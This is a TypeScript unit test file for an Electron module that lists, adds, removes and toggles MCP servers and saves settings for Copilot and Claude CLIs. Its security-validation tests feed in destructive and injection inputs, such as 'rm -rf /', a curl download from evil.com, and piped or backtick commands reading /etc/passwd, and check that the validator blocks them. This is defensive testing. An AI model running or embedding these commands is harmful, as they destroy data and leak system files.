/**
 * Unit tests for toolHandlers.ts — MCP server management, command security
 * validation, and settings read/write for both Copilot and Claude CLIs.
 */

// ── vi.mock declarations ────────────────────────────────────────────────────

vi.mock('fs', async (importOriginal) => {
  const orig = await importOriginal<typeof import('fs')>()
  return {
    ...orig,
    readFileSync: vi.fn().mockReturnValue('{}'),
    writeFileSync: vi.fn(),
    existsSync: vi.fn().mockReturnValue(false),
    mkdirSync: vi.fn(),
  }
})

vi.mock('os', () => ({
  homedir: vi.fn().mockReturnValue('/home/testuser'),
}))

// ── Imports & helpers ───────────────────────────────────────────────────────

import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs'

type HandlerMap = Record<string, (...args: unknown[]) => unknown>

function extractHandlers(mockIpcMain: { handle: ReturnType<typeof vi.fn> }): HandlerMap {
  const handlers: HandlerMap = {}
  for (const call of mockIpcMain.handle.mock.calls) {
    handlers[call[0] as string] = call[1] as (...args: unknown[]) => unknown
  }
  return handlers
}

// ── Test suite ──────────────────────────────────────────────────────────────

describe('toolHandlers', () => {
  let handlers: HandlerMap
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let electronMod: any

  beforeAll(async () => {
    vi.resetModules()
    electronMod = await import('electron')
    const mod = await import('./toolHandlers')
    mod.registerToolHandlers(electronMod.ipcMain)
    handlers = extractHandlers(electronMod.ipcMain)
  })

  beforeEach(() => {
    vi.clearAllMocks()
    vi.mocked(existsSync).mockReturnValue(false)
    vi.mocked(readFileSync).mockReturnValue('{}')
  })

  // ── Handler registration ──────────────────────────────────────────────

  describe('handler registration', () => {
    it('registers all expected IPC channels', () => {
      const expected = [
        'tools:list-mcp-servers',
        'tools:add-mcp-server',
        'tools:remove-mcp-server',
        'tools:toggle-mcp-server',
        'tools:get-settings',
        'tools:save-settings',
      ]
      for (const ch of expected) {
        expect(handlers[ch]).toBeDefined()
      }
    })
  })

  // ── tools:list-mcp-servers ────────────────────────────────────────────

  describe('tools:list-mcp-servers', () => {
    it('returns empty array when no config files exist', async () => {
      vi.mocked(existsSync).mockReturnValue(false)

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'copilot' },
      ) as Array<Record<string, unknown>>

      expect(result).toEqual([])
    })

    it('lists servers from copilot user config', async () => {
      vi.mocked(existsSync).mockImplementation((p) => {
        return String(p).includes('.copilot/mcp-config.json')
      })
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: {
          'my-server': {
            command: 'npx',
            args: ['-y', 'mcp-server'],
            env: { KEY: 'val' },
          },
        },
      }))

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'copilot' },
      ) as Array<Record<string, unknown>>

      const srv = result.find((s) => s.name === 'my-server')
      expect(srv).toBeDefined()
      expect(srv!.command).toBe('npx')
      expect(srv!.args).toEqual(['-y', 'mcp-server'])
      expect(srv!.env).toEqual({ KEY: 'val' })
      expect(srv!.enabled).toBe(true)
      expect(srv!.source).toBe('user')
      expect(srv!.cli).toBe('copilot')
    })

    it('lists servers from claude user config', async () => {
      vi.mocked(existsSync).mockImplementation((p) => {
        return String(p).includes('.claude/mcp-config.json')
      })
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: {
          'claude-srv': { command: 'node', args: ['server.js'] },
        },
      }))

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'claude' },
      ) as Array<Record<string, unknown>>

      expect(result.find((s) => s.name === 'claude-srv')).toBeDefined()
      expect(result.find((s) => s.name === 'claude-srv')!.cli).toBe('claude')
    })

    it('includes project-scoped servers with correct source', async () => {
      vi.mocked(existsSync).mockReturnValue(true)
      vi.mocked(readFileSync).mockImplementation((p) => {
        const path = String(p)
        if (path.includes('.github/copilot/mcp-config.json')) {
          return JSON.stringify({
            mcpServers: {
              'project-srv': { command: 'npx', args: ['srv'] },
            },
          })
        }
        return JSON.stringify({ mcpServers: {} })
      })

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'copilot', workingDirectory: '/my/project' },
      ) as Array<Record<string, unknown>>

      const projectSrv = result.find((s) => s.name === 'project-srv')
      expect(projectSrv).toBeDefined()
      expect(projectSrv!.source).toBe('project')
    })

    it('marks disabled servers as enabled: false', async () => {
      vi.mocked(existsSync).mockReturnValue(true)
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: {
          'disabled-srv': { command: 'npx', disabled: true },
        },
      }))

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'copilot' },
      ) as Array<Record<string, unknown>>

      const srv = result.find((s) => s.name === 'disabled-srv')
      expect(srv).toBeDefined()
      expect(srv!.enabled).toBe(false)
    })

    it('handles malformed JSON gracefully (falls back to empty)', async () => {
      vi.mocked(existsSync).mockReturnValue(true)
      vi.mocked(readFileSync).mockReturnValue('not json!')

      const result = await handlers['tools:list-mcp-servers'](
        {}, { cli: 'copilot' },
      ) as Array<Record<string, unknown>>

      expect(result).toEqual([])
    })
  })

  // ── tools:add-mcp-server ──────────────────────────────────────────────

  describe('tools:add-mcp-server', () => {
    it('adds a valid MCP server to user config', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot',
        scope: 'user',
        name: 'test-server',
        command: 'npx',
        args: ['-y', '@test/mcp'],
        env: { TOKEN: 'secret' },
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(writeFileSync).toHaveBeenCalled()
      // Verify the written content includes the new server
      const writtenContent = JSON.parse(
        vi.mocked(writeFileSync).mock.calls[0][1] as string,
      )
      expect(writtenContent.mcpServers['test-server']).toBeDefined()
      expect(writtenContent.mcpServers['test-server'].command).toBe('npx')
      expect(writtenContent.mcpServers['test-server'].args).toEqual(['-y', '@test/mcp'])
      expect(writtenContent.mcpServers['test-server'].env).toEqual({ TOKEN: 'secret' })
    })

    it('adds a server to project-scoped config', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'claude',
        scope: 'project',
        name: 'project-srv',
        command: 'node',
        args: ['srv.js'],
        workingDirectory: '/my/project',
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      // Should write to project path
      const writePath = vi.mocked(writeFileSync).mock.calls[0][0] as string
      expect(writePath).toContain('/my/project/.claude/mcp-config.json')
    })

    // ── Command security validation ──────────────────────────────────

    it('blocks dangerous commands (rm)', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'evil',
        command: 'rm', args: ['-rf', '/'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('blocked')
      expect(writeFileSync).not.toHaveBeenCalled()
    })

    it('blocks dangerous commands (bash)', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'shell',
        command: 'bash', args: ['-c', 'echo hi'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('blocked')
    })

    it('blocks dangerous commands (curl)', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'downloader',
        command: 'curl', args: ['http://evil.com/payload'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('blocked')
    })

    it('blocks dangerous commands even with full path', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'sneaky',
        command: '/usr/bin/rm', args: ['-rf', '/'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('blocked')
    })

    it('blocks commands with shell metacharacters in args', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'injector',
        command: 'npx', args: ['-y', 'pkg; rm -rf /'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('metacharacter')
    })

    it('blocks pipe operators in args', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'piper',
        command: 'npx', args: ['--yes', 'srv | cat /etc/passwd'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('metacharacter')
    })

    it('blocks backtick injection in args', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'backtick',
        command: 'node', args: ['`whoami`.js'],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('metacharacter')
    })

    it('blocks empty command', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'empty',
        command: '', args: [],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('empty')
    })

    it('blocks whitespace-only command', async () => {
      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'spaces',
        command: '   ', args: [],
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('empty')
    })

    it('returns warning for unknown commands', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'custom',
        command: 'my-custom-binary', args: [],
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(result.warning).toContain('not in the known-safe list')
    })

    it('does not warn for known-safe commands', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'safe',
        command: 'npx', args: ['-y', '@test/srv'],
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(result.warning).toBeUndefined()
    })

    it('does not warn for absolute path commands', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'abs',
        command: '/usr/local/bin/my-server', args: [],
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(result.warning).toBeUndefined()
    })

    it('does not warn for relative path commands', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'rel',
        command: './bin/my-server', args: [],
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(result.warning).toBeUndefined()
    })

    it('appends to existing servers without overwriting', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: { existing: { command: 'npx', args: ['old'] } },
      }))

      await handlers['tools:add-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'new-srv',
        command: 'node', args: ['new.js'],
      })

      const written = JSON.parse(vi.mocked(writeFileSync).mock.calls[0][1] as string)
      expect(written.mcpServers.existing).toBeDefined()
      expect(written.mcpServers['new-srv']).toBeDefined()
    })
  })

  // ── tools:remove-mcp-server ────────────────────────────────────────────

  describe('tools:remove-mcp-server', () => {
    it('removes a server from config', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: {
          'keep-me': { command: 'npx', args: [] },
          'remove-me': { command: 'node', args: [] },
        },
      }))

      const result = await handlers['tools:remove-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'remove-me',
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      const written = JSON.parse(vi.mocked(writeFileSync).mock.calls[0][1] as string)
      expect(written.mcpServers['remove-me']).toBeUndefined()
      expect(written.mcpServers['keep-me']).toBeDefined()
    })

    it('succeeds even if server does not exist (idempotent)', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:remove-mcp-server']({}, {
        cli: 'claude', scope: 'project', name: 'nonexistent',
        workingDirectory: '/proj',
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
    })
  })

  // ── tools:toggle-mcp-server ────────────────────────────────────────────

  describe('tools:toggle-mcp-server', () => {
    it('disables a server by setting disabled: true', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: { 'my-srv': { command: 'npx', args: ['srv'] } },
      }))

      const result = await handlers['tools:toggle-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'my-srv', enabled: false,
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      const written = JSON.parse(vi.mocked(writeFileSync).mock.calls[0][1] as string)
      expect(written.mcpServers['my-srv'].disabled).toBe(true)
    })

    it('enables a server by removing disabled property', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        mcpServers: { 'my-srv': { command: 'npx', args: [], disabled: true } },
      }))

      const result = await handlers['tools:toggle-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'my-srv', enabled: true,
      }) as Record<string, unknown>

      expect(result.success).toBe(true)
      const written = JSON.parse(vi.mocked(writeFileSync).mock.calls[0][1] as string)
      expect(written.mcpServers['my-srv'].disabled).toBeUndefined()
    })

    it('returns error for non-existent server', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({ mcpServers: {} }))

      const result = await handlers['tools:toggle-mcp-server']({}, {
        cli: 'copilot', scope: 'user', name: 'ghost', enabled: true,
      }) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('not found')
    })
  })

  // ── tools:get-settings ──────────────────────────────────────────────────

  describe('tools:get-settings', () => {
    it('returns claude settings from .claude/settings.json', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        allowedTools: ['Read', 'Write'],
        model: 'opus',
      }))

      const result = await handlers['tools:get-settings'](
        {}, { cli: 'claude', workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result.allowedTools).toEqual(['Read', 'Write'])
      expect(result.model).toBe('opus')
    })

    it('returns copilot settings from .github/copilot/settings.json', async () => {
      vi.mocked(readFileSync).mockReturnValue(JSON.stringify({
        experimental: true,
        model: 'claude-sonnet-4.5',
      }))

      const result = await handlers['tools:get-settings'](
        {}, { cli: 'copilot', workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result.experimental).toBe(true)
    })

    it('returns empty object when settings file does not exist', async () => {
      vi.mocked(readFileSync).mockImplementation(() => {
        throw new Error('ENOENT')
      })

      const result = await handlers['tools:get-settings'](
        {}, { cli: 'claude', workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result).toEqual({})
    })
  })

  // ── tools:save-settings ─────────────────────────────────────────────────

  describe('tools:save-settings', () => {
    it('saves claude settings to .claude/settings.json', async () => {
      const settings = { allowedTools: ['Bash'], model: 'sonnet' }

      const result = await handlers['tools:save-settings'](
        {}, { cli: 'claude', settings, workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(mkdirSync).toHaveBeenCalled()
      const writePath = vi.mocked(writeFileSync).mock.calls[0][0] as string
      expect(writePath).toContain('/proj/.claude/settings.json')
      const written = JSON.parse(vi.mocked(writeFileSync).mock.calls[0][1] as string)
      expect(written.allowedTools).toEqual(['Bash'])
    })

    it('saves copilot settings to .github/copilot/settings.json', async () => {
      const settings = { experimental: true }

      const result = await handlers['tools:save-settings'](
        {}, { cli: 'copilot', settings, workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result.success).toBe(true)
      const writePath = vi.mocked(writeFileSync).mock.calls[0][0] as string
      expect(writePath).toContain('/proj/.github/copilot/settings.json')
    })

    it('creates parent directories if they do not exist', async () => {
      const result = await handlers['tools:save-settings'](
        {}, { cli: 'claude', settings: {}, workingDirectory: '/new/proj' },
      ) as Record<string, unknown>

      expect(result.success).toBe(true)
      expect(mkdirSync).toHaveBeenCalledWith(
        expect.stringContaining('/new/proj/.claude'),
        { recursive: true },
      )
    })

    it('returns error on write failure', async () => {
      vi.mocked(writeFileSync).mockImplementation(() => {
        throw new Error('EACCES: permission denied')
      })

      const result = await handlers['tools:save-settings'](
        {}, { cli: 'claude', settings: {}, workingDirectory: '/proj' },
      ) as Record<string, unknown>

      expect(result.success).toBe(false)
      expect(result.error).toContain('EACCES')
    })
  })
})
